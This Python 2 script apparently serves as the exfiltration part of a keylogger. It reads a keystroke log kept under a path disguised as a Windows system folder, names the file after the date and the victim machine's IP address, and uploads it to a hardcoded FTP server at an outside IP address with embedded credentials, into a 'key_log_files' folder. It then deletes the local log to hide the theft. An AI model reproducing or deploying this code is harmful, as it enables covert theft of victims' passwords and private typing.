import socket
import ftplib
import os
import datetime

def getSystemIP():
    hostname = socket.gethostname()
    IP = socket.gethostbyname(hostname)
    return IP

def getDate():
    i=datetime.datetime.now()
    return str(i.day)+"D"+str(i.month)+"M"+str(i.year)+"Y"

def getName():
    FName=getDate()+"@"+getSystemIP()+".txt"
    return FName

def ftp():
    log_name= r"C:\Windows Files\system 32\drivers\etc\files\host\log.ob"
    try:
        SERVER="31.170.162.223" #Specify your FTP Server address
        USERNAME="a1659661" #Specify your FTP Username
        PASSWORD="urotropine314" #Specify your FTP Password
        SSL=0 #Set 1 for SSL and 0 for normal connection
        OUTPUT_DIR="/" #Specify output directory here
        if SSL==0:
            ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
        elif SSL==1:
            ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
        ft.cwd(OUTPUT_DIR)
        fp=open(log_name,'rb')
        Filename= getName()
        cmd= 'STOR' +' '+"/key_log_files/"+Filename #Here Filename is name of file stored on FTP server
        ft.storbinary(cmd,fp)
        ft.quit()
        fp.close()
        os.remove(log_name)     #log.ob is log file on local server
    except Exception, e:
        print e
    return True

